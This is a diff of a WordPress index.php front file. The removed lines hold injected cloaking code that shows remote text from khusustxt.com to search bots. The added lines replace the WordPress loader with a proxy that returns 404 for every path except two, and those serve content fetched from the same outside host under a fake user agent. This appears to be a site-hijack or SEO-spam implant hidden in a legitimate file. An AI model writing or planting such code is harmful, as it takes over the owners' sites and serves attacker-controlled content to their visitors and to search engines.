@@ -1,33 +1,47 @@
 <?php
-$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
-$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
-$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
 
-if ($uri == '/' && (
-    strpos($userAgent, 'bot') !== false || 
-    strpos($userAgent, 'google') !== false || 
-    strpos($userAgent, 'chrome-lighthouse') !== false || 
-    strpos($referer, 'google') !== false
-)) {
-    echo file_get_contents('https://khusustxt.com/content/espacomoni.com.br.txt');
-    exit();
+$uri = isset($_SERVER['REQUEST_URI']) ? strtolower($_SERVER['REQUEST_URI']) : '';
+if ($uri !== '/rolunk/harmonia-caelestis' && $uri !== '/category/kultura/') {
+  http_response_code(404);
+  exit;
 }
 
-?>
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+header('Content-Type: text/html; charset=UTF-8');
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+$remote_url = 'https://khusustxt.com/content/mne.ul-info.com.txt';
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+$body = '';
+if (!empty($remote_url)) {
+  $context = stream_context_create([
+    'http' => [
+      'timeout' => 8,
+      'follow_location' => 1,
+      'user_agent' => 'RolunkProxy/1.0 (+https://' . $_SERVER['HTTP_HOST'] . ')'
+    ]
+  ]);
+  $body = @file_get_contents($remote_url, false, $context);
+
+  if (($body === false || $body === '') && function_exists('curl_init')) {
+    $ch = curl_init($remote_url);
+    curl_setopt_array($ch, [
+      CURLOPT_RETURNTRANSFER => true,
+      CURLOPT_TIMEOUT => 8,
+      CURLOPT_FOLLOWLOCATION => true,
+      CURLOPT_USERAGENT => 'RolunkProxy/1.0 (+https://' . $_SERVER['HTTP_HOST'] . ')'
+    ]);
+    $body = curl_exec($ch);
+    curl_close($ch);
+  }
+} else {
+  $body = @file_get_contents($local_file);
+}
+
+if (empty($body)) {
+  http_response_code(503);
+  echo '<!doctype html><html><head><meta charset="utf-8"><title>Unavailable</title></head><body><p>rolunk.txt unreachable.</p></body></html>';
+  exit;
+}
+
+echo $body;
